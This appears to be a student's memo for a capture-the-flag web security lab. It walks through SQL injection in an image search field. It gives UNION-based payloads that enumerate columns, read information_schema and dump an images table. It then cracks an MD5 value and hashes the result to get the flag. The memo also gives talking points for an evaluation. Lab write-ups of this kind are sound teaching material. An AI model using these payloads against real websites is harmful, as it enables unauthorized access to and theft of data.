# 🖼️ SQL Injection – Image Search Field – MEMO

## 📌 Breach Summary

This vulnerability targets an input field (image search) that is vulnerable to **SQL injection**. The web application does not sanitize user input properly, allowing malicious SQL queries to be executed on the backend.

By injecting SQL into the search field, we can either:
- List available database records
- Reveal hidden images
- Extract sensitive data
- Trigger errors that leak info (Boolean or error-based SQLi)

---

## ✅ Step-by-Step Guide

### 1. 🔎 Locate the Search Field
- Navigate to: `http://<target-ip>/`
- Go to the **image gallery** or **search by title** feature.
- Find the input field to search images by keyword.

### 2. 🧪 Test for SQL Injection
In the search bar, test classic payloads:

- Use '1 OR 1=1 UNION SELECT NULL, NULL--' to get the columns
- Use '1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns' to get columns for images
- Use '1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images' to get all the info (screenshot 'sql')
- Copy the code, use md5 to decrypt (the result is 'albatroz'), then sh256 will give us the flag.

### 3. 💬 What to Say During Evaluation
- Describe what SQL injection is and how input should be sanitized.
- Explain how this type of injection lets you bypass logic or leak data.
- Clarify the meaning of each payload you used.
- Show how you discovered the flag and what you learned from it.

### 4. 📚 References
- OWASP A1: Injection
- SQL Injection Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- Tools used: Browser, optionally sqlmap (not allowed for automation in eval), Burp Suite (manual testing only)